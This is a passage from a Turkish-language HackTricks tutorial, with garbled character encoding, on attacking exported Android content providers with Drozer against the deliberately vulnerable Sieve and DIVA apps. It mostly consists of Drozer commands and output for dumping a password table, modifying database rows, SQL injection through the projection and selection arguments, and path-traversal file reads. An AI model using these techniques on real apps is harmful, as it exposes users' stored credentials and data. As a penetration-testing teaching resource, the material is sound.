# Ä°Ã§erik SaÄŸlayÄ±cÄ±larÄ±ndan Yararlanma

## Ä°Ã§erik SaÄŸlayÄ±cÄ±larÄ±ndan Yararlanma

<details>

<summary><strong>SÄ±fÄ±rdan kahraman olmak iÃ§in AWS hackleme Ã¶ÄŸrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks'i desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ± gÃ¶rmek istiyorsanÄ±z** veya **HackTricks'i PDF olarak indirmek istiyorsanÄ±z** [**ABONELÄ°K PLANLARI**]'na gÃ¶z atÄ±n (https://github.com/sponsors/carlospolop)!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) koleksiyonumuzu keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family)
* **KatÄ±lÄ±n** ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya bizi **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)** takip edin.**
* **Hacking pÃ¼f noktalarÄ±nÄ±zÄ± paylaÅŸarak PR'lar gÃ¶ndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na katkÄ±da bulunun.

</details>

## GiriÅŸ

Veri, bir uygulamadan diÄŸerlerine bir bileÅŸen olan **iÃ§erik saÄŸlayÄ±cÄ±** aracÄ±lÄ±ÄŸÄ±yla istek Ã¼zerine **saÄŸlanÄ±r**. Bu istekler, **ContentResolver sÄ±nÄ±fÄ±** yÃ¶ntemleri aracÄ±lÄ±ÄŸÄ±yla yÃ¶netilir. Ä°Ã§erik saÄŸlayÄ±cÄ±larÄ±, verilerini **veritabanÄ±**, **dosyalar** veya **aÄŸ Ã¼zerinden** Ã§eÅŸitli konumlarda saklayabilir.

_Manifest.xml_ dosyasÄ±nda iÃ§erik saÄŸlayÄ±cÄ±sÄ±nÄ±n deklarasyonu gereklidir. Ã–rneÄŸin:
```xml
<provider android:name=".DBContentProvider" android:exported="true" android:multiprocess="true" android:authorities="com.mwr.example.sieve.DBContentProvider">
<path-permission android:readPermission="com.mwr.example.sieve.READ_KEYS" android:writePermission="com.mwr.example.sieve.WRITE_KEYS" android:path="/Keys"/>
</provider>
```
`content://com.mwr.example.sieve.DBContentProvider/Keys`'e eriÅŸmek iÃ§in `READ_KEYS` iznine ihtiyaÃ§ vardÄ±r. GeliÅŸtirici hatasÄ± nedeniyle korunan `/Keys` yolu deÄŸil, `/Keys/` bÃ¶lÃ¼mÃ¼ne eriÅŸilebilir durumda olduÄŸu dikkat Ã§ekicidir.

**Belki Ã¶zel verilere eriÅŸebilir veya bazÄ± zafiyetleri (SQL Enjeksiyonu veya Yol GeÃ§iÅŸi) sÃ¶mÃ¼rebilirsiniz.**

## **AÃ§Ä±ÄŸa Ã§Ä±karÄ±lan iÃ§erik saÄŸlayÄ±cÄ±lardan bilgi alÄ±n**
```
dz> run app.provider.info -a com.mwr.example.sieve
Package: com.mwr.example.sieve
Authority: com.mwr.example.sieve.DBContentProvider
Read Permission: null
Write Permission: null
Content Provider: com.mwr.example.sieve.DBContentProvider
Multiprocess Allowed: True
Grant Uri Permissions: False
Path Permissions:
Path: /Keys
Type: PATTERN_LITERAL
Read Permission: com.mwr.example.sieve.READ_KEYS
Write Permission: com.mwr.example.sieve.WRITE_KEYS
Authority: com.mwr.example.sieve.FileBackupProvider
Read Permission: null
Write Permission: null
Content Provider: com.mwr.example.sieve.FileBackupProvider
Multiprocess Allowed: True
Grant Uri Permissions: False
```
**DBContentProvider**'a nasÄ±l ulaÅŸÄ±lacaÄŸÄ±nÄ± anlamak iÃ§in URIs'ler "_content://_" ile baÅŸlatÄ±labilir. Bu yaklaÅŸÄ±m, Drozer kullanÄ±rken kazanÄ±lan iÃ§gÃ¶rÃ¼lere dayanmaktadÄ±r ve Ã¶nemli bilgilerin _/Keys_ dizininde bulunduÄŸu tespit edilmiÅŸtir.

Drozer **birkaÃ§ URI tahmin edip deneyebilir**:
```
dz> run scanner.provider.finduris -a com.mwr.example.sieve
Scanning com.mwr.example.sieve...
Unable to Query content://com.mwr.example.sieve.DBContentProvider/
...
Unable to Query content://com.mwr.example.sieve.DBContentProvider/Keys
Accessible content URIs:
content://com.mwr.example.sieve.DBContentProvider/Keys/
content://com.mwr.example.sieve.DBContentProvider/Passwords
content://com.mwr.example.sieve.DBContentProvider/Passwords/
```
AyrÄ±ca, sorgularÄ± aramak iÃ§in **ContentProvider kodunu** kontrol etmelisiniz:

![](<../../../.gitbook/assets/image (121) (1) (1) (1).png>)

AyrÄ±ca, tam sorgularÄ± bulamazsanÄ±z, ContentProvider tarafÄ±ndan `onCreate` yÃ¶nteminde **hangi isimlerin bildirildiÄŸini kontrol edebilirsiniz**:

![](<../../../.gitbook/assets/image (561).png>)

Sorgu ÅŸu ÅŸekilde olacaktÄ±r: `content://name.of.package.class/declared_name`

## **VeritabanÄ± Destekli Content Provider'lar**

Muhtemelen Content Provider'larÄ±n Ã§oÄŸu bir **veritabanÄ±** iÃ§in bir **arayÃ¼z** olarak kullanÄ±lÄ±r. Bu nedenle, eriÅŸebilirseniz, bilgi **Ã§Ä±karabilir, gÃ¼ncelleme yapabilir, ekleyebilir ve silebilirsiniz**.\
**Hassas bilgilere eriÅŸip eriÅŸemediÄŸinizi kontrol edin** veya **yetkilendirme mekanizmalarÄ±nÄ± atlayacak ÅŸekilde deÄŸiÅŸtirmeyi deneyin**.

Content Provider'Ä±n kodunu kontrol ederken, ayrÄ±ca _query, insert, update ve delete_ gibi adlandÄ±rÄ±lmÄ±ÅŸ **fonksiyonlarÄ±** arayÄ±n:

![](<../../../.gitbook/assets/image (884).png>)

![](<../../../.gitbook/assets/image (254) (1) (1) (1) (1) (1) (1) (1).png>)

Ã‡Ã¼nkÃ¼ bunlarÄ± Ã§aÄŸÄ±rabileceksiniz

### Ä°Ã§erik sorgusu
```
dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --vertical
_id: 1
service: Email
username: incognitoguy50
password: PSFjqXIMVa5NJFudgDuuLVgJYFD+8w==
-
email: incognitoguy50@gmail.com
```
### Ä°Ã§erik ekle

VeritabanÄ±nÄ± sorgulayarak **sÃ¼tunlarÄ±n adÄ±nÄ±** Ã¶ÄŸreneceksiniz, sonra, DB'ye veri ekleyebilirsiniz:

![](<../../../.gitbook/assets/image (95).png>)

![](<../../../.gitbook/assets/image (170).png>)

_Not: Ekleme ve gÃ¼ncellemede --string'i dizeyi, --double'Ä± Ã§ifti, --float'Ä±, --integer'Ä±, --long'u, --short'Ä±, --boolean'Ä± belirtmek iÃ§in kullanabilirsiniz_

### Ä°Ã§eriÄŸi gÃ¼ncelle

SÃ¼tunlarÄ±n adÄ±nÄ± bildiÄŸinizde **giriÅŸleri deÄŸiÅŸtirebilirsiniz**:

![](<../../../.gitbook/assets/image (777).png>)

### Ä°Ã§eriÄŸi sil

![](<../../../.gitbook/assets/image (420).png>)

### **SQL Enjeksiyonu**

SQL enjeksiyonunu **(SQLite)** test etmek basittir, iÃ§erik saÄŸlayÄ±cÄ±ya iletilen **projeksiyon** ve **seÃ§im alanlarÄ±nÄ±** manipÃ¼le ederek.\
Ä°Ã§erik SaÄŸlayÄ±cÄ±yÄ± sorgularken bilgi aramak iÃ§in 2 ilginÃ§ argÃ¼man vardÄ±r: _--seÃ§im_ ve _--projeksiyon_:

![](<../../../.gitbook/assets/image (781).png>)

Bu **parametreleri** kÃ¶tÃ¼ye kullanarak **SQL enjeksiyonlarÄ±nÄ±** test edebilirsiniz:
```
dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --selection "'"
unrecognized token: "')" (code 1): , while compiling: SELECT * FROM Passwords WHERE (')
```

```
dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection "*
FROM SQLITE_MASTER WHERE type='table';--"
| type  | name             | tbl_name         | rootpage | sql              |
| table | android_metadata | android_metadata | 3        | CREATE TABLE ... |
| table | Passwords        | Passwords        | 4        | CREATE TABLE ... |
```
**Drozer ile Otomatik SQLInjection KeÅŸfi**
```
dz> run scanner.provider.injection -a com.mwr.example.sieve
Scanning com.mwr.example.sieve...
Injection in Projection:
content://com.mwr.example.sieve.DBContentProvider/Keys/
content://com.mwr.example.sieve.DBContentProvider/Passwords
content://com.mwr.example.sieve.DBContentProvider/Passwords/
Injection in Selection:
content://com.mwr.example.sieve.DBContentProvider/Keys/
content://com.mwr.example.sieve.DBContentProvider/Passwords
content://com.mwr.example.sieve.DBContentProvider/Passwords/

dz> run scanner.provider.sqltables -a jakhar.aseem.diva
Scanning jakhar.aseem.diva...
Accessible tables for uri content://jakhar.aseem.diva.provider.notesprovider/notes/:
android_metadata
notes
sqlite_sequence
```
## **Dosya Sistemi Destekli Ä°Ã§erik SaÄŸlayÄ±cÄ±lar**

Ä°Ã§erik saÄŸlayÄ±cÄ±lar ayrÄ±ca **dosyalara eriÅŸmek** iÃ§in de kullanÄ±labilir:

![](<../../../.gitbook/assets/image (404).png>)

### Dosya **okuma**

Ä°Ã§erik saÄŸlayÄ±cÄ±dan dosyalarÄ± okuyabilirsiniz
```
dz> run app.provider.read content://com.mwr.example.sieve.FileBackupProvider/etc/hosts
127.0.0.1            localhost
```
### **Yol GeÃ§iÅŸi**

Dosyalara eriÅŸebiliyorsanÄ±z, Yol GeÃ§iÅŸi'ni kÃ¶tÃ¼ye kullanmaya Ã§alÄ±ÅŸabilirsiniz (bu durumda gerekli olmasa da "_../_" ve benzeri hileleri deneyebilirsiniz).
```
dz> run app.provider.read content://com.mwr.example.sieve.FileBackupProvider/etc/hosts
127.0.0.1            localhost
```
**Drozer tarafÄ±ndan Otomatik Yol GeÃ§iÅŸi keÅŸfi**
```
dz> run scanner.provider.traversal -a com.mwr.example.sieve
Scanning com.mwr.example.sieve...
Vulnerable Providers:
content://com.mwr.example.sieve.FileBackupProvider/
content://com.mwr.example.sieve.FileBackupProvider
```
## Referanslar

* [https://www.tutorialspoint.com/android/android\_content\_providers.htm](https://www.tutorialspoint.com/android/android\_content\_providers.htm)
* [https://manifestsecurity.com/android-application-security-part-15/](https://manifestsecurity.com/android-application-security-part-15/)
* [https://labs.withsecure.com/content/dam/labs/docs/mwri-drozer-user-guide-2015-03-23.pdf](https://labs.withsecure.com/content/dam/labs/docs/mwri-drozer-user-guide-2015-03-23.pdf)

<details>

<summary><strong>AWS hacklemeyi sÄ±fÄ±rdan kahramana Ã¶ÄŸrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ±zÄ± gÃ¶rmek istiyorsanÄ±z** veya **HackTricks'i PDF olarak indirmek istiyorsanÄ±z** [**ABONELÄ°K PLANLARI**](https://github.com/sponsors/carlospolop)'na gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* **ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n veya bizi **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)'da **takip edin**.
* **Hacking pÃ¼f noktalarÄ±nÄ±zÄ± paylaÅŸarak PR'lar gÃ¶ndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na katkÄ±da bulunun.

</details>
